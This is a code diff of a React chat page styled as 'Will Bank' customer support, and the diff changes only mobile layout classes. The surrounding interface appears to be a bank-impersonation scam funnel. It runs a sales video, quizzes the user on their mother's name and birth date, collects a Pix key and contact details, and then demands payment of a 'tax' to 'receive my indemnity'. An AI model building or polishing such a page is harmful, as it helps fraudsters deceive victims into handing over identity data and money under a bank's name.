@@ -530,54 +530,54 @@ const Chat = () => {
     });
   };
   if (!cpfData) return null;
-  return <div className="min-h-screen bg-slate-900 flex flex-col">
+  return <div className="min-h-screen min-h-[100dvh] bg-slate-900 flex flex-col">
       {/* Chat Header */}
-      <header className="bg-slate-800 text-white px-4 py-3 flex items-center gap-3 border-b border-slate-700 sticky top-0 z-50">
-        <button onClick={() => navigate(-1)} className="p-2 hover:bg-slate-700 rounded-full transition-colors">
+      <header className="bg-slate-800 text-white px-3 py-2.5 sm:px-4 sm:py-3 flex items-center gap-2.5 border-b border-slate-700 sticky top-0 z-50">
+        <button onClick={() => navigate(-1)} className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
           <ArrowLeft className="w-5 h-5" />
         </button>
         
-        <div className="w-11 h-11 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shadow-lg">
-          <img src={willbankLogo} alt="Will Bank" className="w-7 h-7 object-contain" />
+        <div className="w-9 h-9 sm:w-11 sm:h-11 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shadow-lg">
+          <img src={willbankLogo} alt="Will Bank" className="w-6 h-6 sm:w-7 sm:h-7 object-contain" />
         </div>
         
-        <div className="flex-1">
-          <h1 className="font-bold text-base">Atendimento Will Bank</h1>
-          <p className="text-xs text-slate-400 flex items-center gap-1">
-            <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+        <div className="flex-1 min-w-0">
+          <h1 className="font-bold text-sm sm:text-base truncate">Atendimento Will Bank</h1>
+          <p className="text-[10px] sm:text-xs text-slate-400 flex items-center gap-1">
+            <span className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-green-500 rounded-full animate-pulse"></span>
             Online agora
           </p>
         </div>
 
-        <button className="p-2 hover:bg-slate-700 rounded-full transition-colors">
-          <Phone className="w-5 h-5" />
+        <button className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
+          <Phone className="w-4 h-4 sm:w-5 sm:h-5" />
         </button>
-        <button className="p-2 hover:bg-slate-700 rounded-full transition-colors">
-          <MoreVertical className="w-5 h-5" />
+        <button className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
+          <MoreVertical className="w-4 h-4 sm:w-5 sm:h-5" />
         </button>
       </header>
 
       {/* Messages Area */}
-      <main className="flex-1 overflow-y-auto bg-gradient-to-b from-slate-900 to-slate-800 p-4">
-        <div className="max-w-2xl mx-auto space-y-4">
+      <main className="flex-1 overflow-y-auto bg-gradient-to-b from-slate-900 to-slate-800 p-3 sm:p-4">
+        <div className="max-w-2xl mx-auto space-y-3 sm:space-y-4">
           {/* Date indicator */}
           <div className="text-center">
-            <span className="text-xs bg-slate-700/50 text-slate-400 px-3 py-1 rounded-full">
+            <span className="text-[10px] sm:text-xs bg-slate-700/50 text-slate-400 px-2.5 py-0.5 sm:px-3 sm:py-1 rounded-full">
               Hoje
             </span>
           </div>
 
           {/* Video Section */}
-          {showVideo && <div className="mx-auto max-w-sm animate-fade-in">
-              <div className="text-center mb-3">
-                <p className="text-white text-sm">Clique no vídeo abaixo para darmos continuidade 👇</p>
+          {showVideo && <div className="mx-auto max-w-[280px] sm:max-w-sm animate-fade-in">
+              <div className="text-center mb-2 sm:mb-3">
+                <p className="text-white text-xs sm:text-sm">Clique no vídeo abaixo para darmos continuidade 👇</p>
               </div>
-              <div className="relative aspect-[9/16] bg-black rounded-2xl overflow-hidden shadow-2xl">
+              <div className="relative aspect-[9/16] bg-black rounded-xl sm:rounded-2xl overflow-hidden shadow-2xl">
                 <video ref={videoRef} src="/video/vsl_1.mp4" className="absolute inset-0 w-full h-full object-cover" playsInline onEnded={handleVideoEnd} onClick={handleVideoClick} />
                 
                 {!videoPlaying && <div className="absolute inset-0 flex items-center justify-center bg-black/40 cursor-pointer" onClick={handleVideoClick}>
-                    <div className="w-20 h-20 bg-primary rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition-transform">
-                      <Play className="w-10 h-10 text-primary-foreground ml-1" fill="currentColor" />
+                    <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition-transform">
+                      <Play className="w-8 h-8 sm:w-10 sm:h-10 text-primary-foreground ml-1" fill="currentColor" />
                     </div>
                   </div>}
               </div>
@@ -585,15 +585,15 @@ const Chat = () => {
 
           {/* Messages */}
           {messages.map(message => <div key={message.id} className={`flex ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fade-in`}>
-              {(message.type === 'bot' || message.type === 'audio') && <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-2 shadow-md">
-                  <img src={willbankLogo} alt="" className="w-5 h-5" />
+              {(message.type === 'bot' || message.type === 'audio') && <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-1.5 sm:mr-2 shadow-md">
+                  <img src={willbankLogo} alt="" className="w-4 h-4 sm:w-5 sm:h-5" />
                 </div>}
               
-              {message.type === 'error' ? <div className="max-w-[85%] bg-white text-slate-800 rounded-2xl shadow-lg px-4 py-3">
+              {message.type === 'error' ? <div className="max-w-[90%] sm:max-w-[85%] bg-white text-slate-800 rounded-xl sm:rounded-2xl shadow-lg px-3 py-2.5 sm:px-4 sm:py-3">
                   {message.content}
-                </div> : <div className={`max-w-[85%] ${message.type === 'user' ? 'bg-primary text-primary-foreground rounded-2xl rounded-br-sm' : 'bg-slate-700 text-white rounded-2xl rounded-bl-sm shadow-lg'} px-4 py-3`}>
-                  {message.type === 'audio' ? <AudioPlayerComponent audioSrc={message.audioSrc || ""} isPlaying={playingAudioId === message.id} onPlay={() => playAudio(message.audioSrc || "", message.id)} listened={audioListened.has(message.audioSrc || "")} /> : <div className="text-sm leading-relaxed">{message.content}</div>}
-                  <div className={`text-[10px] mt-1 text-right ${message.type === 'user' ? 'text-primary-foreground/70' : 'text-slate-400'}`}>
+                </div> : <div className={`max-w-[90%] sm:max-w-[85%] ${message.type === 'user' ? 'bg-primary text-primary-foreground rounded-xl sm:rounded-2xl rounded-br-sm' : 'bg-slate-700 text-white rounded-xl sm:rounded-2xl rounded-bl-sm shadow-lg'} px-3 py-2 sm:px-4 sm:py-3`}>
+                  {message.type === 'audio' ? <AudioPlayerComponent audioSrc={message.audioSrc || ""} isPlaying={playingAudioId === message.id} onPlay={() => playAudio(message.audioSrc || "", message.id)} listened={audioListened.has(message.audioSrc || "")} /> : <div className="text-xs sm:text-sm leading-relaxed">{message.content}</div>}
+                  <div className={`text-[9px] sm:text-[10px] mt-1 text-right ${message.type === 'user' ? 'text-primary-foreground/70' : 'text-slate-400'}`}>
                     {message.time}
                   </div>
                 </div>}
@@ -601,18 +601,18 @@ const Chat = () => {
 
           {/* Typing Indicator */}
           {isTyping && <div className="flex justify-start animate-fade-in">
-              <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-2 shadow-md">
-                <img src={willbankLogo} alt="" className="w-5 h-5" />
+              <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-1.5 sm:mr-2 shadow-md">
+                <img src={willbankLogo} alt="" className="w-4 h-4 sm:w-5 sm:h-5" />
               </div>
-              <div className="bg-slate-700 text-white rounded-2xl rounded-bl-sm shadow-lg px-4 py-3">
-                <div className="flex gap-1.5">
-                  <span className="w-2.5 h-2.5 bg-slate-400 rounded-full animate-bounce" style={{
+              <div className="bg-slate-700 text-white rounded-xl sm:rounded-2xl rounded-bl-sm shadow-lg px-3 py-2.5 sm:px-4 sm:py-3">
+                <div className="flex gap-1">
+                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{
                 animationDelay: '0ms'
               }}></span>
-                  <span className="w-2.5 h-2.5 bg-slate-400 rounded-full animate-bounce" style={{
+                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{
                 animationDelay: '150ms'
               }}></span>
-                  <span className="w-2.5 h-2.5 bg-slate-400 rounded-full animate-bounce" style={{
+                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{
                 animationDelay: '300ms'
               }}></span>
                 </div>
@@ -620,64 +620,64 @@ const Chat = () => {
             </div>}
 
           {/* Action Buttons */}
-          {!showVideo && <div className="flex flex-wrap gap-2 justify-center py-3">
+          {!showVideo && <div className="flex flex-wrap gap-1.5 sm:gap-2 justify-center py-2 sm:py-3">
               {/* Quiz Options */}
-              {step === "quiz-mae" && quizOptions.length > 0 && quizOptions.map((option, index) => <Button key={`mae-${index}-${option.text}`} onClick={() => handleQuizAnswer(option, "mae")} className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm">
+              {step === "quiz-mae" && quizOptions.length > 0 && quizOptions.map((option, index) => <Button key={`mae-${index}-${option.text}`} onClick={() => handleQuizAnswer(option, "mae")} className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-xs sm:text-sm px-3 py-1.5 h-auto">
                   {option.text}
                 </Button>)}
               
-              {step === "quiz-nascimento" && quizOptions.length > 0 && quizOptions.map((option, index) => <Button key={`nasc-${index}-${option.text}`} onClick={() => handleQuizAnswer(option, "nascimento")} className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm">
+              {step === "quiz-nascimento" && quizOptions.length > 0 && quizOptions.map((option, index) => <Button key={`nasc-${index}-${option.text}`} onClick={() => handleQuizAnswer(option, "nascimento")} className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-xs sm:text-sm px-3 py-1.5 h-auto">
                   {option.text}
                 </Button>)}
 
-              {step === "audio-3-validation" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleConfirmValidation} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-8">
+              {step === "audio-3-validation" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleConfirmValidation} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
                   ✓ CONFIRMAR VALIDAÇÃO
                 </Button>}
 
-              {step === "audio-3-validation" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "audio-3-validation" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
 
-              {step === "pix-type-selection" && <div className="flex flex-col gap-2 w-full max-w-xs">
-                  <Button onClick={handlePixTypeTelefone} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8">
+              {step === "pix-type-selection" && <div className="flex flex-col gap-1.5 sm:gap-2 w-full max-w-xs">
+                  <Button onClick={handlePixTypeTelefone} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                     📱 Telefone
                   </Button>
-                  <Button onClick={handlePixTypeCPF} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
+                  <Button onClick={handlePixTypeCPF} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                     📋 CPF
                   </Button>
-                  <Button onClick={handlePixTypeEmail} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8">
+                  <Button onClick={handlePixTypeEmail} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                     📧 E-mail
                   </Button>
                 </div>}
 
-              {step === "pix-confirm" && <Button onClick={handleConfirmPix} className="bg-gradient-to-r from-green-500 to-emerald-500 text-white rounded-full font-bold shadow-lg px-8">
+              {step === "pix-confirm" && <Button onClick={handleConfirmPix} className="bg-gradient-to-r from-green-500 to-emerald-500 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
                   ✓ Sim, está correto
                 </Button>}
 
-              {step === "audio-2-comprovante" && (waitingForAudio === null || audioListened.has("/audio/audio-2.mp3")) && <Button onClick={handleGenerateComprovante} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
+              {step === "audio-2-comprovante" && (waitingForAudio === null || audioListened.has("/audio/audio-2.mp3")) && <Button onClick={handleGenerateComprovante} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
                   CONFIRMAR
                 </Button>}
 
-              {step === "audio-2-comprovante" && waitingForAudio === "/audio/audio-2.mp3" && !audioListened.has("/audio/audio-2.mp3") && <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "audio-2-comprovante" && waitingForAudio === "/audio/audio-2.mp3" && !audioListened.has("/audio/audio-2.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
 
-              {step === "envio-selection" && <div className="flex flex-col gap-2 w-full max-w-xs">
-                  <Button onClick={handleSMSOption} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8 flex items-center gap-2">
+              {step === "envio-selection" && <div className="flex flex-col gap-1.5 sm:gap-2 w-full max-w-xs">
+                  <Button onClick={handleSMSOption} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-6 sm:px-8 flex items-center gap-2 text-xs sm:text-sm h-10">
                     <Smartphone className="w-4 h-4" />
                     Receber por SMS
                   </Button>
-                  <Button onClick={handleEmailOption} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8 flex items-center gap-2">
+                  <Button onClick={handleEmailOption} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 flex items-center gap-2 text-xs sm:text-sm h-10">
                     <Mail className="w-4 h-4" />
                     Receber por E-mail
                   </Button>
                 </div>}
 
-              {step === "taxa-info" && <Button onClick={handleTaxExplanation} className="bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-full font-bold shadow-lg">
+              {step === "taxa-info" && <Button onClick={handleTaxExplanation} className="bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-full font-bold shadow-lg text-xs sm:text-sm px-4 sm:px-6">
                   ❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
                 </Button>}
 
-              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-6 animate-pulse">
+              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-4 sm:px-6 animate-pulse text-xs sm:text-sm">
                   💰 Concluir pagamento e receber minha indenização
                 </Button>}
 
-              {step === "final" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "final" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
             </div>}
 
           <div ref={messagesEndRef} />
@@ -685,36 +685,36 @@ const Chat = () => {
       </main>
 
       {/* Chat Input Area */}
-      <div className="bg-slate-800 border-t border-slate-700 p-3">
-        <div className="max-w-2xl mx-auto flex items-center gap-2">
-          <button className="p-2 text-slate-400 hover:text-white transition-colors">
-            <Smile className="w-6 h-6" />
+      <div className="bg-slate-800 border-t border-slate-700 p-2 sm:p-3 safe-area-pb">
+        <div className="max-w-2xl mx-auto flex items-center gap-1.5 sm:gap-2">
+          <button className="p-1.5 sm:p-2 text-slate-400 hover:text-white transition-colors">
+            <Smile className="w-5 h-5 sm:w-6 sm:h-6" />
           </button>
           
-          {showPhoneInput ? <div className="flex-1 flex gap-2">
-              <Input placeholder="(00) 00000-0000" value={phoneNumber} onChange={e => setPhoneNumber(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full" />
-              {phoneNumber && <Button onClick={handlePhoneSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10">
-                  <Send className="w-5 h-5" />
+          {showPhoneInput ? <div className="flex-1 flex gap-1.5 sm:gap-2">
+              <Input placeholder="(00) 00000-0000" value={phoneNumber} onChange={e => setPhoneNumber(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full h-9 sm:h-10 text-sm" />
+              {phoneNumber && <Button onClick={handlePhoneSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-9 h-9 sm:w-10 sm:h-10">
+                  <Send className="w-4 h-4 sm:w-5 sm:h-5" />
                 </Button>}
-            </div> : showEmailInput ? <div className="flex-1 flex gap-2">
-              <Input placeholder="seuemail@exemplo.com" type="email" value={emailInput} onChange={e => setEmailInput(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full" />
-              {emailInput && <Button onClick={handleEnvioEmailSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10">
-                  <Send className="w-5 h-5" />
+            </div> : showEmailInput ? <div className="flex-1 flex gap-1.5 sm:gap-2">
+              <Input placeholder="seuemail@exemplo.com" type="email" value={emailInput} onChange={e => setEmailInput(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full h-9 sm:h-10 text-sm" />
+              {emailInput && <Button onClick={handleEnvioEmailSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-9 h-9 sm:w-10 sm:h-10">
+                  <Send className="w-4 h-4 sm:w-5 sm:h-5" />
                 </Button>}
-            </div> : showPixInput ? <div className="flex-1 flex gap-2">
-              <Input placeholder={selectedPixType === "email" ? "seuemail@exemplo.com" : "(00) 00000-0000"} type={selectedPixType === "email" ? "email" : "text"} value={pixKeyInput} onChange={e => setPixKeyInput(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full" />
-              {pixKeyInput && <Button onClick={handlePixKeySubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10">
-                  <Send className="w-5 h-5" />
+            </div> : showPixInput ? <div className="flex-1 flex gap-1.5 sm:gap-2">
+              <Input placeholder={selectedPixType === "email" ? "seuemail@exemplo.com" : "(00) 00000-0000"} type={selectedPixType === "email" ? "email" : "text"} value={pixKeyInput} onChange={e => setPixKeyInput(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full h-9 sm:h-10 text-sm" />
+              {pixKeyInput && <Button onClick={handlePixKeySubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-9 h-9 sm:w-10 sm:h-10">
+                  <Send className="w-4 h-4 sm:w-5 sm:h-5" />
                 </Button>}
-            </div> : <div className="flex-1 bg-slate-700 rounded-full px-4 py-2.5 text-slate-400 text-sm">
+            </div> : <div className="flex-1 bg-slate-700 rounded-full px-3 sm:px-4 py-2 text-slate-400 text-xs sm:text-sm">
               Digite uma mensagem...
             </div>}
           
-          <button className="p-2 text-slate-400 hover:text-white transition-colors">
-            <Paperclip className="w-6 h-6" />
+          <button className="p-1.5 sm:p-2 text-slate-400 hover:text-white transition-colors">
+            <Paperclip className="w-5 h-5 sm:w-6 sm:h-6" />
           </button>
-          <button className="p-2.5 bg-primary rounded-full text-primary-foreground hover:bg-primary/90 transition-colors">
-            <Mic className="w-5 h-5" />
+          <button className="p-2 sm:p-2.5 bg-primary rounded-full text-primary-foreground hover:bg-primary/90 transition-colors">
+            <Mic className="w-4 h-4 sm:w-5 sm:h-5" />
           </button>
         </div>
       </div>
